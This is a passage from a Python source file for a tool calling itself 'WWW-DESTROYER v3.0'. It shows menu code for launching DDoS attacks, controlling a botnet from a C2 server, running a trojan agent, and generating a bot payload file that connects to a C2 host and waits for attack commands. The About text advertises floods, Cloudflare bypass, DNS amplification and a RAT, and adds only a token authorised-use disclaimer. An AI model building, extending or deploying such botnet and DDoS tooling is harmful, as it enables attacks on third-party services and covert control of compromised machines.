        host = input("  C2 Server IP: ").strip()
        port = int(input("  C2 Port (default 4443): ").strip() or "4443")
        password = input("  Password: ").strip()
        
        bot = BotClient(host, port, password)
        bot.start()
    
    elif choice == "3":
        host = input("  C2 Server IP: ").strip()
        port = int(input("  C2 Port (default 4443): ").strip() or "4443")
        password = input("  Password: ").strip()
        
        trojan = TrojanAgent(host, port, password)
        trojan.connect_and_execute()
    
    input("\n  Press Enter to continue...")


def menu_tools():
    """Yardımcı araçlar"""
    print_banner()
    print("\n  Additional Tools\n")
    print("  [1] Proxy Scanner (Find open proxies)")
    print("  [2] IP Spoofer Settings")
    print("  [3] Network Stress Test (Local)")
    print("  [4] Generate Bot Payload")
    print("  [0] Back")
    
    choice = input("\n  Select: ").strip()
    
    if choice == "4":
        print("\n  [+] Generating bot payload...")
        host = input("  C2 Server IP: ").strip()
        port = input("  C2 Port: ").strip()
        password = input("  Password: ").strip()
        
        payload = f'''#!/usr/bin/env python3
import socket, threading, os, time, random, requests, ssl, struct, json, base64

C2_HOST = "{host}"
C2_PORT = {port}
C2_PASS = "{password}"

class BotClient:
    def __init__(self):
        self.sock = None
        self.running = True
    
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((C2_HOST, C2_PORT))
        self.sock.send(C2_PASS.encode())
        return self.sock.recv(1024).decode() == "AUTH_OK"
    
    def start(self):
        if self.connect():
            print("[+] Bot connected to C2")
            while self.running:
                try:
                    data = self.sock.recv(1024)
                    if data:
                        cmd = data.decode().strip()
                        if cmd.startswith("ATTACK:"):
                            target = cmd[7:]
                            print(f"[!] Attacking {{target}}")
                            # Flood here
                        elif cmd == "STOP":
                            print("[!] Attack stopped")
                except:
                    break
        self.sock.close()

if __name__ == "__main__":
    BotClient().start()
'''
        print(f"\n  [+] Bot payload generated for {host}:{port}")
        print("\n  Payload:\n")
        print(payload[:500] + "...")
        
        with open("bot_payload.py", "w") as f:
            f.write(payload)
        print("\n  [+] Saved to bot_payload.py")
    
    input("\n  Press Enter to continue...")


def main():
    """Ana menü"""
    while True:
        print_banner()
        print(f"  Local IP: {get_local_ip()}")
        print("\n  [1] Launch DDoS Attack")
        print("  [2] C2 Server / Botnet Control")
        print("  [3] Tools & Payloads")
        print("  [4] About")
        print("  [0] Exit")
        
        choice = input("\n  Select: ").strip()
        
        if choice == "1":
            target = input("\n  Target URL/IP: ").strip()
            if target:
                menu_attack(target)
        
        elif choice == "2":
            menu_c2()
        
        elif choice == "3":
            menu_tools()
        
        elif choice == "4":
            print_banner()
            print("""
  WWW-DESTROYER v3.0
  Advanced Penetration Testing Suite
  
  Features:
  - Layer 7 HTTP/HTTPS Flood with Cloudflare bypass
  - Layer 4 SYN/UDP/ICMP Flood
  - Slowloris connection exhaustion
  - DNS Amplification
  - C2 Command & Control Center
  - Botnet management
  - Trojan / RAT agent
  - Proxy support
  - Multi-threaded architecture
  
  Authorized security testing tool.
  Only use on systems you own or have 
  explicit written permission to test.
            """)
            input("\n  Press Enter to continue...")
        
        elif choice == "0":
            print("\n  Exiting...")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n  [!] Fatal error: {e}")
        sys.exit(1)
